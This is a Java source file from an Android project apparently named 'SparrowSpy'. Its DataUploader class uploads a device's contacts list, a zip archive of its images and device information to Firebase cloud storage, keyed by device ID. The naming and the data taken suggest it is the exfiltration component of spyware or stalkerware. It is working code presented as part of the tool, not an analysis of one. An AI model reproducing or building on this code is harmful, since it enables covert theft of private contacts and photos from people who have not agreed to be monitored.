package com.tangledbytes.sparrowspy.server;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.Utils;

import java.util.ArrayList;
import java.util.List;

public class DataUploader {
    private static final String TAG = "DataUploader";
    private final StorageReference root;
    private final SharedPreferences prefs = Constants.appPrefs;

    public DataUploader(Context context) {
        FirebaseStorage storage = FirebaseManager.getFirebaseStorage();
        root = storage.getReference(Constants.FS_DEVICES).child(new Utils(context).getDeviceId());
    }

    public UploadTask uploadContacts() {
        StorageReference contactsJSON = root.child(Constants.FILE_SERVER_CONTACTS.getName());
        if (!Constants.FILE_SERVER_CONTACTS.exists()) return null;
        UploadTask uploadTaskContacts = contactsJSON.putFile(Uri.fromFile(Constants.FILE_SERVER_CONTACTS));
        uploadTaskContacts.addOnSuccessListener(taskSnapshot -> prefs.edit().putBoolean(Constants.PREF_CONTACTS_STATUS, true).commit());
        uploadTaskContacts.addOnFailureListener(e -> {
            prefs.edit().putBoolean(Constants.PREF_CONTACTS_STATUS, false).apply();
            Log.e(TAG, "Failed to upload contacts");
        });
        return uploadTaskContacts;
    }

    public UploadTask uploadImages() {
        StorageReference imagesZip = root.child(Constants.FILE_SERVER_IMAGES_ZIP.getName());
        if (!Constants.FILE_SERVER_IMAGES_ZIP.exists()) return null;
        UploadTask uploadTaskImages = imagesZip.putFile(Uri.fromFile(Constants.FILE_SERVER_IMAGES_ZIP));
        uploadTaskImages.addOnSuccessListener(taskSnapshot -> prefs.edit().putBoolean(Constants.PREF_IMAGES_STATUS, true).apply());
        uploadTaskImages.addOnFailureListener(e -> {
            prefs.edit().putBoolean(Constants.PREF_IMAGES_STATUS, false).apply();
            Log.e(TAG, "Failed to upload images");
        });
        return uploadTaskImages;
    }

    public UploadTask uploadDeviceInfo() {
        StorageReference deviceInfoJSON = root.child(Constants.FILE_SERVER_DEVICE_INFO.getName());
        if (!Constants.FILE_SERVER_DEVICE_INFO.exists()) return null;
        UploadTask uploadTaskDeviceInfo = deviceInfoJSON.putFile(Uri.fromFile(Constants.FILE_SERVER_DEVICE_INFO));
        uploadTaskDeviceInfo.addOnSuccessListener(taskSnapshot -> prefs.edit().putBoolean(Constants.PREF_DEVICE_INFO_STATUS, true).apply());
        uploadTaskDeviceInfo.addOnFailureListener(e -> {
            prefs.edit().putBoolean(Constants.PREF_DEVICE_INFO_STATUS, false).apply();
            Log.wtf(TAG, "Failed to upload device info", e);
        });
        return uploadTaskDeviceInfo;
    }
}
